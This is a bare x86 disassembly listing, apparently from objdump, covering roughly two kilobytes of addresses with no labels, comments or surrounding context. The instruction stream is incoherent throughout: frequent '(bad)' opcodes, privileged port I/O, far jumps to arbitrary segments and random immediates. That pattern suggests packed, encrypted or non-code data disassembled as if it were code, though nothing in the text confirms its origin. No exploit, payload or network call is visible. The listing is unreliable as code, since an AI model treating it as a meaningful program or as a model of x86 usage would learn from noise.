  4193ff:	stc    
  419400:	sbb    eax,0x819f7b33
  419405:	cmp    cl,bh
  419407:	in     al,dx
  419408:	rol    BYTE PTR [ebx-0x725965b3],0x84
  41940f:	out    0x9e,eax
  419411:	lds    ecx,FWORD PTR [ebx+0x9]
  419414:	push   ecx
  419415:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419416:	sbb    ebx,DWORD PTR [ecx-0x8d012f7]
  41941c:	lods   eax,DWORD PTR ds:[esi]
  41941d:	fadd   DWORD PTR [ebx+edi*1]
  419420:	cmp    BYTE PTR [edx],dl
  419422:	pop    ds
  419423:	xor    eax,0xe0ee6fc8
  419428:	ds mov edx,0xd28fbe27
  41942e:	add    eax,0x34edfba0
  419433:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419434:	jmp    DWORD PTR [ebx]
  419436:	mov    edi,0xca4f489e
  41943b:	xor    eax,0x26bab2f5
  419440:	push   ebx
  419441:	arpl   WORD PTR [esi+0x51],di
  419444:	retf   0x5e90
  419447:	xlat   BYTE PTR ds:[ebx]
  419448:	and    eax,0xbfdf7bac
  41944d:	repnz push es
  41944f:	cmp    al,0xc2
  419451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419452:	les    edx,FWORD PTR [ebx-0x37]
  419455:	ins    BYTE PTR es:[edi],dx
  419456:	sbb    al,0xa8
  419458:	cmp    esp,ebp
  41945a:	or     bh,ch
  41945c:	adc    DWORD PTR ds:0x39f17018,esi
  419462:	xchg   edx,eax
  419463:	xchg   edi,eax
  419464:	cmc    
  419465:	sbb    al,0x5c
  419467:	(bad)  
  419468:	(bad)  
  419469:	sti    
  41946a:	lods   eax,DWORD PTR ds:[esi]
  41946b:	(bad)  
  41946c:	in     eax,dx
  41946d:	sbb    eax,0x88ffcec2
  419472:	fcmovnbe st,st(4)
  419474:	dec    esp
  419475:	inc    edx
  419476:	jne    0x4194b0
  419478:	in     al,0xcf
  41947a:	adc    eax,0x1995127b
  41947f:	rcr    BYTE PTR [ebx+0x63],cl
  419482:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419483:	jb     0x419442
  419485:	lahf   
  419486:	sti    
  419487:	fdivrp st(7),st
  419489:	cmp    al,0x5
  41948b:	jo     0x41945c
  41948d:	aaa    
  41948e:	adc    al,0x40
  419490:	adc    DWORD PTR [esp+ecx*8-0x47795f9],esi
  419497:	iret   
  419498:	stos   DWORD PTR es:[edi],eax
  419499:	mov    ecx,0x38c49de2
  41949e:	xchg   DWORD PTR [esi],esi
  4194a0:	mov    esi,0xe5f2e740
  4194a5:	mov    esp,0xbeb97ded
  4194aa:	mov    esp,0xb2acac7c
  4194af:	out    0xbb,al
  4194b1:	push   ss
  4194b2:	out    0xe3,al
  4194b4:	int3   
  4194b5:	cli    
  4194b6:	mov    edi,0x5f7a8bb4
  4194bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194bc:	loop   0x419454
  4194be:	sub    DWORD PTR [edx-0x335a01fe],esi
  4194c4:	lea    edi,[ecx+0x6505a75f]
  4194ca:	lods   al,BYTE PTR ds:[esi]
  4194cb:	inc    esp
  4194cc:	jae    0x4194fb
  4194ce:	inc    ecx
  4194cf:	ins    DWORD PTR es:[edi],dx
  4194d0:	and    esi,DWORD PTR gs:0x9c4ecf4a
  4194d7:	mov    esp,0xdc548d6b
  4194dc:	mov    eax,0xd390ebb1
  4194e1:	mov    ecx,0x8b34e643
  4194e6:	jmp    0x37d7d2f4
  4194eb:	es leave 
  4194ed:	inc    edi
  4194ee:	jbe    0x419498
  4194f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194f1:	mov    cl,0x42
  4194f3:	and    esp,DWORD PTR [ebx-0x2]
  4194f6:	fcom   QWORD PTR ds:0x45216045
  4194fc:	test   ah,bl
  4194fe:	or     DWORD PTR [ebp-0x71e7a9d9],ebp
  419504:	outs   dx,BYTE PTR ds:[esi]
  419505:	jl     0x419556
  419507:	adc    al,BYTE PTR [esp+ecx*2]
  41950a:	scas   al,BYTE PTR es:[edi]
  41950b:	pop    ebp
  41950c:	sub    al,0x0
  41950e:	dec    esi
  41950f:	mov    BYTE PTR ds:0x9c102b8,cl
  419515:	cmp    edx,DWORD PTR [edi+0x73f67fdc]
  41951b:	xor    al,0x20
  41951d:	push   edi
  41951e:	call   0x3a738663
  419523:	add    eax,esi
  419525:	stc    
  419526:	test   BYTE PTR [edx+0x1a],0xa6
  41952a:	sub    cl,dl
  41952c:	mov    edi,0xb9148df5
  419531:	add    cl,BYTE PTR [ebp-0x24]
  419534:	push   cs
  419535:	sbb    BYTE PTR [ebp-0x3160c912],dh
  41953b:	pop    esp
  41953c:	dec    ebx
  41953d:	mov    al,ds:0x375c916d
  419542:	inc    edx
  419543:	in     eax,0x10
  419545:	jne    0x4194fc
  419547:	mov    esp,0xf9b6cbd9
  41954c:	push   edi
  41954d:	cmp    BYTE PTR [ebx+ebp*1-0x7700a9ce],0x3c
  419555:	pop    ebx
  419556:	jl     0x4194ea
  419558:	in     al,0x60
  41955a:	mov    ch,0x8d
  41955c:	cmp    esi,DWORD PTR [esi+0x21d1dc65]
  419562:	ficomp WORD PTR [edx-0x7f5dd77a]
  419568:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419569:	cmp    DWORD PTR [ecx-0x54],ecx
  41956c:	and    ah,BYTE PTR [ecx+0x20497f11]
  419572:	inc    ecx
  419573:	nop
  419574:	inc    ebp
  419575:	xor    BYTE PTR [ebx+0x20],ah
  419578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419579:	adc    esp,eax
  41957b:	mov    ebx,0x64473561
  419580:	xchg   DWORD PTR [edx-0x324b7030],ebp
  419586:	sub    ebx,DWORD PTR [ebp+0x68]
  419589:	pop    eax
  41958a:	jp     0x419515
  41958c:	popf   
  41958d:	mov    ds:0x97b69ca4,eax
  419592:	dec    edi
  419593:	(bad)  
  419594:	jl     0x419603
  419596:	pusha  
  419597:	outs   dx,DWORD PTR ds:[si]
  419599:	and    eax,0x7ecadf64
  41959e:	jbe    0x41960b
  4195a0:	lahf   
  4195a1:	push   ds
  4195a2:	xchg   ecx,eax
  4195a3:	add    eax,DWORD PTR [edi-0x29]
  4195a6:	cmp    bl,BYTE PTR [ecx-0x3367c7ab]
  4195ac:	sub    edx,DWORD PTR [ebx+0x41]
  4195af:	push   ss
  4195b0:	push   edi
  4195b1:	and    edi,DWORD PTR [eax+0x2b]
  4195b4:	dec    ebp
  4195b5:	cmp    al,0xf5
  4195b7:	out    dx,al
  4195b8:	dec    edx
  4195b9:	dec    eax
  4195ba:	mov    al,ds:0xdb36978e
  4195bf:	jo     0x419551
  4195c1:	mov    ch,0x1e
  4195c3:	mov    ah,0xac
  4195c5:	sub    ah,dl
  4195c7:	pop    eax
  4195c8:	xor    esi,DWORD PTR [ecx-0x49]
  4195cb:	aaa    
  4195cc:	fsubr  st,st(5)
  4195ce:	xchg   ebp,eax
  4195cf:	inc    edi
  4195d0:	jl     0x419563
  4195d2:	aaa    
  4195d3:	mov    eax,0xc84bf23e
  4195d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195d9:	(bad)  
  4195da:	xchg   esp,eax
  4195db:	jecxz  0x4195f5
  4195dd:	pop    ecx
  4195de:	sar    BYTE PTR [esi-0x4b],0x4c
  4195e2:	dec    eax
  4195e3:	mov    esp,0xcba6a022
  4195e8:	sbb    al,0x63
  4195ea:	adc    eax,0x48f327c0
  4195ef:	adc    al,0xe6
  4195f1:	xchg   ecx,eax
  4195f2:	xor    DWORD PTR [esi-0x4a],0xffffffbe
  4195f6:	in     al,0x22
  4195f8:	fmul   QWORD PTR [ebx-0x43]
  4195fb:	adc    edx,DWORD PTR [esp+ecx*2-0xc]
  4195ff:	aas    
  419600:	push   0xffffffab
  419602:	push   es
  419603:	lahf   
  419604:	aam    0x75
  419606:	ret    0xfe80
  419609:	mov    ds:0xa121d0f6,al
  41960e:	cmp    eax,0x644dc13a
  419613:	scas   al,BYTE PTR es:[edi]
  419614:	sbb    bl,BYTE PTR [ecx+eiz*1-0x5c]
  419618:	add    BYTE PTR [ecx+0x24517ec4],0xd9
  41961f:	mov    ch,0x78
  419621:	sub    al,0xed
  419623:	div    BYTE PTR [edx+0x6150f520]
  419629:	outs   dx,BYTE PTR ds:[esi]
  41962a:	xor    al,0x90
  41962c:	xor    DWORD PTR [edx],ebp
  41962e:	in     eax,dx
  41962f:	mov    esp,0xe056310a
  419634:	inc    ebp
  419635:	cmp    cl,al
  419637:	cli    
  419638:	push   es
  419639:	div    DWORD PTR [ecx-0x7]
  41963c:	or     bh,BYTE PTR [ecx]
  41963e:	inc    ecx
  41963f:	(bad)  
  419640:	dec    edx
  419641:	and    ebp,esp
  419643:	sbb    DWORD PTR [ebx-0x616866d1],esi
  419649:	pop    ebp
  41964a:	sub    DWORD PTR [ecx+0x6d3ddce1],0xffffffe3
  419651:	xor    ah,BYTE PTR [eax]
  419653:	popa   
  419654:	mov    dl,0x2a
  419656:	push   ss
  419657:	jl     0x419618
  419659:	mov    esp,ecx
  41965b:	add    BYTE PTR [ecx],bl
  41965d:	add    edx,DWORD PTR [eax]
  41965f:	mov    WORD PTR [ebx],cs
  419661:	imul   ebx,DWORD PTR [ecx-0x7b5450ca],0xfffffff5
  419668:	cmp    BYTE PTR [ebx],0xab
  41966b:	mov    esi,gs
  41966d:	je     0x419690
  41966f:	lds    edi,FWORD PTR [eax-0x76]
  419672:	or     DWORD PTR [eax-0x45],edi
  419675:	xor    ecx,ecx
  419677:	xchg   DWORD PTR [ecx],ebp
  419679:	mov    al,0xa
  41967b:	mov    edx,0x2a64922e
  419680:	mov    esi,0xcf4c100b
  419685:	inc    esp
  419686:	jbe    0x419685
  419688:	cmp    al,bl
  41968a:	push   ss
  41968b:	fwait
  41968c:	mov    bl,BYTE PTR ds:0x8c8d98f1
  419692:	cmp    ch,BYTE PTR [edx]
  419694:	and    esi,ebp
  419696:	sbb    esp,DWORD PTR [ebp-0x3a]
  419699:	fdivp  st(5),st
  41969b:	(bad)  
  41969c:	add    al,BYTE PTR [ecx+0x39f69f47]
  4196a2:	out    0x81,eax
  4196a4:	mov    al,0x7d
  4196a6:	dec    edx
  4196a7:	or     BYTE PTR [edx+0x40f5ee08],dh
  4196ad:	and    edi,DWORD PTR [ebx]
  4196af:	push   ecx
  4196b0:	sbb    al,0x4c
  4196b2:	mov    eax,0xcc4abd55
  4196b7:	xchg   edi,eax
  4196b8:	outs   dx,DWORD PTR ds:[esi]
  4196b9:	cmp    eax,0xe2da8c7b
  4196be:	loop   0x419714
  4196c0:	mov    dh,0x92
  4196c2:	jecxz  0x419696
  4196c4:	inc    edi
  4196c5:	cwde   
  4196c6:	add    DWORD PTR [ebp-0x5834395c],ebx
  4196cc:	mov    WORD PTR [edx+0x18],gs
  4196cf:	sbb    esi,DWORD PTR [esi]
  4196d1:	push   cs
  4196d2:	popf   
  4196d3:	sub    DWORD PTR [edx],0xa290f1f2
  4196d9:	xlat   BYTE PTR ds:[ebx]
  4196da:	dec    ebx
  4196db:	mov    al,ds:0x6bd1e44a
  4196e0:	jmp    0x591723d2
  4196e5:	jl     0x419684
  4196e7:	push   esi
  4196e8:	inc    ebp
  4196e9:	xor    DWORD PTR [ecx],edi
  4196eb:	fs sbb al,0x2
  4196ee:	bound  ecx,QWORD PTR [ebx+esi*1]
  4196f1:	cmp    DWORD PTR [ecx],ebp
  4196f3:	sub    DWORD PTR [eax+ebp*2+0x6936368e],0xffffffe6
  4196fb:	daa    
  4196fc:	fidivr DWORD PTR [ebx+0x6b8ea3c2]
  419703:	add    edi,edi
  419705:	int    0x5a
  419707:	xchg   esi,eax
  419708:	cmp    eax,0x4ef405c4
  41970d:	pop    eax
  41970e:	imul   DWORD PTR [esi+0x1edbfff2]
  419714:	lea    esi,[esi-0xda43b28]
  41971a:	add    DWORD PTR [ecx-0x60c9790d],esp
  419720:	int3   
  419721:	test   DWORD PTR [edx+0x32],ebp
  419724:	pop    ecx
  419725:	push   eax
  419726:	mov    bl,0x63
  419728:	retf   
  419729:	add    ch,BYTE PTR [esi-0x35]
  41972c:	jno    0x4196fc
  41972e:	cmp    cl,ch
  419730:	stos   BYTE PTR es:[edi],al
  419731:	arpl   WORD PTR [esi+0x767f84d4],ax
  419737:	loope  0x419734
  419739:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41973a:	sub    esp,DWORD PTR [eax]
  41973c:	(bad)  
  41973d:	bound  ebx,QWORD PTR [esi]
  41973f:	push   0x377fd9d
  419744:	leave  
  419745:	xchg   ebx,eax
  419746:	imul   ecx,DWORD PTR [esi+edx*4+0x8],0x12
  41974b:	pextrw ebx,(bad),0xc5
  41974d:	push   ds
  41974e:	mov    ebx,esp
  419750:	leave  
  419751:	pop    ecx
  419752:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419753:	jnp    0x419766
  419755:	mov    esi,0x849d22d9
  41975a:	mov    edi,0x123f276b
  41975f:	jae    0x4197d2
  419761:	pushf  
  419762:	lahf   
  419763:	nop
  419764:	add    dh,bh
  419766:	sub    DWORD PTR [eax],ecx
  419768:	cmp    ebp,esi
  41976a:	ins    DWORD PTR es:[edi],dx
  41976b:	mov    ds:0x9dd24b82,eax
  419770:	dec    edi
  419771:	nop
  419772:	test   DWORD PTR ss:0xc60c65b9,esp
  419779:	dec    eax
  41977a:	scas   al,BYTE PTR es:[edi]
  41977b:	and    DWORD PTR [edx],ecx
  41977d:	sub    al,0x74
  41977f:	aam    0x3c
  419781:	jl     0x4197a3
  419783:	fmulp  st(2),st
  419785:	int3   
  419786:	jo     0x419737
  419788:	test   DWORD PTR [ecx+0x4053c7ac],eax
  41978e:	cdq    
  41978f:	stos   BYTE PTR es:[edi],al
  419790:	imul   ecx,esp,0x59
  419793:	jl     0x419801
  419795:	(bad)  
  419796:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419797:	packsswb mm4,mm7
  41979a:	ret    0xb64
  41979d:	out    0x1e,eax
  41979f:	mov    dh,0x5c
  4197a1:	test   BYTE PTR [edi-0x4],ah
  4197a4:	and    DWORD PTR [esi-0x6c32cb93],ecx
  4197aa:	jl     0x419795
  4197ac:	arpl   si,sp
  4197ae:	rol    dl,1
  4197b0:	imul   esp,DWORD PTR [ebp-0x3528ff46],0x45eb9b6f
  4197ba:	inc    eax
  4197bb:	add    al,0x89
  4197bd:	sar    edi,1
  4197bf:	dec    edi
  4197c0:	pushf  
  4197c1:	add    esi,ebx
  4197c3:	arpl   WORD PTR [eax+0x7a466746],bx
  4197c9:	sahf   
  4197ca:	ss jmp 0xab916660
  4197d0:	popf   
  4197d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197d2:	push   eax
  4197d3:	xor    eax,0x4176f570
  4197d8:	outs   dx,DWORD PTR ds:[esi]
  4197d9:	mov    dh,dh
  4197db:	aad    0x26
  4197dd:	aad    0xd5
  4197df:	push   es
  4197e0:	sbb    al,0x44
  4197e2:	adc    bl,BYTE PTR [esi+0x7d0053f9]
  4197e8:	cmc    
  4197e9:	mov    edx,0xde126ff5
  4197ee:	fidiv  DWORD PTR [ebx+0xc]
  4197f1:	jmp    0x1b33:0x660614cb
  4197f8:	repz loop 0x41980d
  4197fb:	and    DWORD PTR [edi+0x25774047],esp
  419801:	push   esi
  419802:	dec    ebp
  419803:	pop    ebp
  419804:	rol    dh,0xd7
  419807:	cmp    esi,ebp
  419809:	push   edi
  41980a:	xor    edx,edi
  41980c:	mov    ebx,0xdf730e0e
  419811:	cmc    
  419812:	icebp  
  419813:	jg     0x4197c0
  419815:	mov    bl,0xde
  419817:	inc    ecx
  419818:	cmp    edx,esi
  41981a:	push   cs
  41981b:	add    dh,BYTE PTR [esi+0x6e1487e4]
  419821:	mov    al,ds:0x913f978d
  419826:	retf   0xa7f1
  419829:	mov    ebp,0x5b14b658
  41982e:	push   0x6e
  419830:	jle    0x419807
  419832:	(bad)
  419836:	mov    ds:0x81c2beff,al
  41983b:	mov    edi,0x245f322c
  419840:	mov    ebx,0xf339cf5c
  419845:	cmp    ebx,DWORD PTR ds:0x8e6c153a
  41984b:	pop    ss
  41984c:	mov    ebx,0x3668bf8d
  419851:	cmp    bh,0xf1
  419854:	sbb    eax,0x4b5a3215
  419859:	cmp    eax,0x230bc6d1
  41985e:	into   
  41985f:	sub    al,0x50
  419861:	sti    
  419862:	stos   DWORD PTR es:[edi],eax
  419863:	adc    BYTE PTR [eax+ebx*1+0x30],bh
  419867:	shl    edi,1
  419869:	in     eax,0x83
  41986b:	leave  
  41986c:	or     BYTE PTR gs:[esi+0x7a],0xbd
  419871:	mov    esp,0x3114fa25
  419876:	imul   eax,DWORD PTR [edx+0x545643b2],0xffffffde
  41987d:	arpl   cx,ax
  41987f:	push   cs
  419880:	aaa    
  419881:	and    ebp,DWORD PTR [ecx-0x3f]
  419884:	(bad)  
  419885:	jmp    0x56bd:0x7f8e8885
  41988c:	add    edi,esp
  41988e:	xor    eax,0x1a017048
  419893:	add    BYTE PTR [edi+0x3],ch
  419896:	jns    0x4198d4
  419898:	(bad)  
  419899:	test   eax,0x16b3128b
  41989e:	xchg   ecx,eax
  41989f:	leave  
  4198a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198a1:	inc    eax
  4198a2:	out    dx,al
  4198a3:	pop    es
  4198a4:	pop    ds
  4198a5:	mov    eax,ds:0x4ca3060b
  4198aa:	xlat   BYTE PTR ds:[ebx]
  4198ab:	inc    esp
  4198ac:	in     al,0x3c
  4198ae:	iret   
  4198af:	mov    ah,BYTE PTR [eax+0x52]
  4198b2:	sub    eax,0x695f359b
  4198b7:	or     eax,DWORD PTR [esp+ecx*8-0x4b94d69d]
  4198be:	push   esp
  4198bf:	ss inc edi
  4198c1:	idiv   dl
  4198c3:	stos   BYTE PTR es:[edi],al
  4198c4:	pop    esi
  4198c5:	retf   
  4198c6:	and    DWORD PTR [edi-0x665bf45b],esp
  4198cc:	sub    BYTE PTR [edi-0x1765e981],ch
  4198d2:	outs   dx,BYTE PTR ds:[esi]
  4198d3:	rcl    BYTE PTR [edi],1
  4198d5:	xor    eax,0xcf67f87b
  4198da:	dec    BYTE PTR [ebx]
  4198dc:	inc    ebx
  4198dd:	(bad)  
  4198de:	xor    cl,BYTE PTR [edi+edi*4-0x22]
  4198e2:	or     al,0x60
  4198e4:	jno    0x41990f
  4198e6:	add    eax,0x371f7a82
  4198eb:	leave  
  4198ec:	test   eax,0x8fc85990
  4198f1:	ins    DWORD PTR es:[edi],dx
  4198f2:	mov    eax,DWORD PTR ds:0xb55c7d6
  4198f8:	add    esp,DWORD PTR [ecx+ebp*8-0x14]
  4198fc:	mov    dl,0x7e
  4198fe:	ins    DWORD PTR es:[edi],dx
  4198ff:	jno    0x419915
  419901:	int3   
  419902:	mov    BYTE PTR [ebx],al
  419904:	les    edx,FWORD PTR [esi-0x65bd3fed]
  41990a:	and    al,0x8f
  41990c:	pop    eax
  41990d:	popa   
  41990e:	int    0x29
  419910:	jmp    0x28bb:0x8a6f0a31
  419917:	stos   DWORD PTR es:[edi],eax
  419918:	aas    
  419919:	mov    ds:0x6e2e9e7f,al
  41991e:	push   eax
  41991f:	inc    ebp
  419920:	out    dx,al
  419921:	ret    0x4dca
  419924:	daa    
  419925:	andnps xmm1,XMMWORD PTR [ecx-0x24629d5a]
  41992c:	mov    ?,ecx
  41992e:	pop    edx
  41992f:	inc    edx
  419930:	xchg   DWORD PTR ds:[esi],ebp
  419933:	in     eax,dx
  419934:	mov    ebp,0x8fa456d7
  419939:	jae    0x4198de
  41993b:	pusha  
  41993c:	mov    dh,BYTE PTR [eax]
  41993e:	test   dh,dh
  419940:	mov    eax,0x917ca9c2
  419945:	arpl   WORD PTR [ecx],bx
  419947:	sub    eax,0x43d7923d
  41994c:	fild   DWORD PTR [ebx-0x53d43d17]
  419952:	xor    cl,BYTE PTR [ebx]
  419954:	pop    es
  419955:	mov    bl,0x9e
  419957:	ret    
  419958:	repz gs inc edi
  41995b:	pop    edi
  41995c:	xchg   edx,ecx
  41995e:	fwait
  41995f:	(bad)  
  419960:	rcr    DWORD PTR [edx+0x3c207911],cl
  419966:	xchg   ebp,eax
  419967:	out    dx,eax
  419968:	test   al,0xa
  41996a:	in     al,dx
  41996b:	outs   dx,DWORD PTR ds:[esi]
  41996c:	sub    al,0x1
  41996e:	out    0x38,eax
  419970:	add    eax,0xc15c87c8
  419975:	icebp  
  419976:	push   edx
  419977:	ror    BYTE PTR ds:0x46697ab,0x9d
  41997e:	sbb    ebx,edi
  419980:	pop    es
  419981:	outs   dx,BYTE PTR ds:[esi]
  419982:	add    al,BYTE PTR [edx+0x49c74ba3]
  419988:	sub    ebx,edi
  41998a:	addr16 push edx
  41998c:	outs   dx,DWORD PTR ds:[esi]
  41998d:	imul   esi,ebx,0x36cabe47
  419993:	(bad)  
  419994:	cld    
  419995:	mov    cl,0x47
  419997:	and    eax,0x8005e560
  41999c:	mov    al,BYTE PTR [esi+0x8]
  41999f:	and    eax,0x444e6ec4
  4199a4:	dec    esi
  4199a5:	sti    
  4199a6:	inc    esp
  4199a7:	lea    esi,[esi]
  4199a9:	or     esp,ebp
  4199ab:	call   0xfff2297f
  4199b0:	push   es
  4199b1:	xchg   esi,eax
  4199b2:	iret   
  4199b3:	add    eax,eax
  4199b5:	outs   dx,DWORD PTR ds:[esi]
  4199b6:	dec    ecx
  4199b7:	add    ebx,edx
  4199b9:	adc    al,0xb8
  4199bb:	sub    ecx,edx
  4199bd:	into   
  4199be:	add    ebx,edx
  4199c0:	cmc    
  4199c1:	popf   
  4199c2:	dec    edi
  4199c3:	jl     0x419a27
  4199c5:	dec    edx
  4199c7:	aam    0xc3
  4199c9:	push   cs
  4199ca:	or     eax,0x814bd150
  4199cf:	loope  0x419a4b
  4199d1:	rcr    BYTE PTR [edx+0xc8b3b00],1
  4199d7:	pop    eax
  4199d8:	xchg   ebx,eax
  4199d9:	mov    dl,0x4c
  4199db:	jne    0x419a10
  4199dd:	addr16 addr16 push edi
  4199e0:	xchg   esp,eax
  4199e1:	sar    DWORD PTR [edi],1
  4199e3:	and    DWORD PTR [edx-0x2a0315f9],ebx
  4199e9:	and    BYTE PTR [edx+0x3],ch
  4199ec:	(bad)  
  4199ed:	hlt    
  4199ee:	mov    bh,0x14
  4199f0:	arpl   bp,si
  4199f2:	cmc    
  4199f3:	mov    cs,WORD PTR [esi+edi*1+0x3b578f21]
  4199fa:	xchg   ebx,eax
  4199fb:	cmp    al,0xbe
  4199fd:	ret    
  4199fe:	mov    esi,0x32871324
  419a03:	test   DWORD PTR [eax-0xd1f5e36],edx
  419a09:	or     bh,dl
  419a0b:	es mov ebp,0x7785524f
  419a11:	push   edi
  419a12:	leave  
  419a13:	xchg   esp,eax
  419a14:	pop    ds
  419a15:	fld    DWORD PTR [ecx]
  419a17:	std    
  419a18:	scas   al,BYTE PTR es:[edi]
  419a19:	mov    DWORD PTR [edx-0x4],esi
  419a1c:	jle    0x419a76
  419a1e:	mov    dh,0xb1
  419a20:	ins    DWORD PTR es:[edi],dx
  419a21:	imul   eax,DWORD PTR [edx+esi*1+0x5120de1],0xbae7509e
  419a2c:	(bad)  
  419a2e:	push   es
  419a2f:	aad    0xd0
  419a31:	ja     0x419aa0
  419a33:	or     eax,0x2482e7f1
  419a38:	loop   0x419a65
  419a3a:	(bad)  
  419a3b:	ins    DWORD PTR es:[edi],dx
  419a3c:	jle    0x419aab
  419a3e:	cwde   
  419a3f:	xchg   ecx,eax
  419a40:	loop   0x419a65
  419a42:	mov    al,ds:0x8983699a
  419a47:	adc    bh,BYTE PTR [esp+ebp*2]
  419a4a:	jl     0x419a56
  419a4c:	add    BYTE PTR [esp+ebp*2+0x3aa26e35],bl
  419a53:	lods   eax,DWORD PTR ds:[esi]
  419a54:	mov    ebx,0xb28939b1
  419a59:	dec    esp
  419a5a:	mov    bp,0xd832
  419a5e:	pop    edi
  419a5f:	ror    BYTE PTR [ebx+0x6685b80],0xa7
  419a66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a67:	mov    edi,0x8554eb
  419a6c:	mov    ch,ah
  419a6e:	and    ah,BYTE PTR [eax-0x1b038cd3]
  419a74:	cmp    al,0x39
  419a76:	xor    DWORD PTR [edi],0xffffffc7
  419a79:	push   0xffffffb7
  419a7b:	test   al,0x4d
  419a7d:	pop    esp
  419a7e:	aad    0xb1
  419a80:	adc    BYTE PTR [ebp-0x342d1ad2],bh
  419a86:	xor    eax,0xda3860e5
  419a8b:	dec    ecx
  419a8c:	out    0x19,al
  419a8e:	push   cs
  419a8f:	pop    eax
  419a90:	out    dx,eax
  419a91:	mov    WORD PTR [eax+esi*2+0x3dea7719],gs
  419a98:	int3   
  419a99:	mov    ecx,DWORD PTR [ebx-0x7a678bd4]
  419a9f:	repz sti 
  419aa1:	cmp    bh,BYTE PTR [edx-0x7d03c0b7]
  419aa7:	lods   al,BYTE PTR ds:[esi]
  419aa8:	into   
  419aa9:	or     BYTE PTR [edi+0x53],dh
  419aac:	mov    esi,0x8a1c4011
  419ab1:	pop    edi
  419ab2:	xor    esp,esi
  419ab4:	cmp    eax,0xcbd6fe82
  419ab9:	push   ecx
  419aba:	or     cl,BYTE PTR [edi+0xd]
  419abd:	sbb    eax,0xf3f6aaab
  419ac2:	push   0x6f7cd75e
  419ac7:	inc    ebp
  419ac8:	sub    eax,DWORD PTR [ecx+ebp*1+0x31]
  419acc:	out    0x4c,al
  419ace:	jbe    0x419a94
  419ad0:	ss push edi
  419ad2:	dec    ebp
  419ad3:	mov    WORD PTR [eax-0x79],fs
  419ad6:	fs sar ebp,0xc3
  419ada:	sbb    esi,DWORD PTR [ebp-0x45]
  419add:	outs   dx,DWORD PTR ds:[esi]
  419ade:	push   edx
  419adf:	inc    ecx
  419ae0:	mov    BYTE PTR [ecx-0x11],bh
  419ae3:	into   
  419ae4:	aam    0x94
  419ae6:	pop    ecx
  419ae7:	dec    edi
  419ae8:	sbb    DWORD PTR [ebx+esi*2-0x5f],esp
  419aec:	adc    ebp,ebp
  419aee:	inc    eax
  419aef:	imul   edi,edi,0x5e
  419af2:	stc    
  419af3:	and    dh,ch
  419af5:	mov    esp,0xa839161a
  419afa:	aas    
  419afb:	mov    cl,0x3b
  419afd:	xchg   edi,eax
  419afe:	arpl   WORD PTR [eax+eiz*4+0x5effce63],ax
  419b05:	(bad)  
  419b06:	jne    0x419ad8
  419b08:	ds cli 
  419b0a:	mov    dh,0x93
  419b0c:	push   ecx
  419b0d:	es mov cl,al
  419b10:	jnp    0x419b46
  419b12:	xchg   edi,eax
  419b13:	ins    DWORD PTR es:[edi],dx
  419b14:	js     0x419ab6
  419b16:	and    bl,al
  419b18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b19:	adc    ebp,DWORD PTR ds:0x9be0d2e3
  419b1f:	data16 loop 0x419ad1
  419b22:	jmp    0x6956:0x95da26f
  419b29:	adc    al,0x66
  419b2b:	daa    
  419b2c:	arpl   WORD PTR [edx+0xdcecf72],bx
  419b32:	div    BYTE PTR [ecx+ebp*2+0x64]
  419b36:	push   edi
  419b37:	enter  0xf44d,0xa2
  419b3b:	mov    cl,0x74
  419b3d:	xchg   edi,eax
  419b3e:	jmp    0x419ac7
  419b40:	mov    bl,0x65
  419b42:	adc    ebp,ecx
  419b44:	repz ss pop ecx
  419b47:	xchg   edx,eax
  419b48:	mov    esp,0x922cabc
  419b4d:	jns    0x419bc1
  419b4f:	inc    ebp
  419b50:	pop    ds
  419b51:	mov    ch,0x45
  419b53:	adc    DWORD PTR [eax],ebx
  419b55:	mov    al,0x6a
  419b57:	div    BYTE PTR [ecx]
  419b59:	lock and BYTE PTR [eax],cl
  419b5c:	dec    ebx
  419b5d:	push   ebx
  419b5e:	pop    ebx
  419b5f:	pop    edi
  419b60:	and    BYTE PTR [ebx],ah
  419b62:	mov    dl,0xc
  419b64:	adc    DWORD PTR [eax+0x23],edx
  419b67:	dec    esp
  419b68:	sbb    dh,ch
  419b6a:	and    BYTE PTR [edi],dh
  419b6c:	xor    ecx,DWORD PTR [esi+0x2e39b027]
  419b72:	ficomp WORD PTR [ebx]
  419b74:	(bad)  
  419b75:	retf   0x320a
  419b78:	adc    BYTE PTR [ebp-0x78],al
  419b7b:	cmp    eax,ecx
  419b7d:	mov    cs,WORD PTR ds:0xd80a3730
  419b83:	pop    ecx
  419b84:	push   esp
  419b85:	jne    0x419b5a
  419b87:	bnd jo 0x419b27
  419b8a:	shl    DWORD PTR [eax],1
  419b8c:	sub    eax,0x4e8fc99
  419b91:	sahf   
  419b92:	pop    ebx
  419b93:	stos   DWORD PTR es:[edi],eax
  419b94:	xchg   esp,eax
  419b95:	imul   DWORD PTR [edi+0x30]
  419b98:	add    esp,DWORD PTR [ebx-0x390cc25c]
  419b9e:	or     eax,0x30f8d8e2
  419ba3:	jmp    0xbec34941
  419ba8:	cld    
  419ba9:	(bad)  
  419baa:	jl     0x419b79
  419bac:	lock repz retf 0x7eff
  419bb1:	mov    edx,0xbbb375f3
  419bb6:	mov    ds:0x8a475f60,eax
  419bbb:	mov    BYTE PTR [esi+0x6cbfda25],cl
  419bc1:	mov    ah,0x30
  419bc3:	mov    al,ds:0x72a1967f
  419bc8:	in     al,0xa
  419bca:	or     DWORD PTR [edx+eax*1-0x1630c4e8],esp
  419bd1:	adc    al,0xae
  419bd3:	jbe    0x419c4e
  419bd5:	iret   
  419bd6:	inc    edx
  419bd7:	fs ja  0x419c20
  419bda:	pop    esi
  419bdb:	fs test al,0x65
  419bde:	popa   
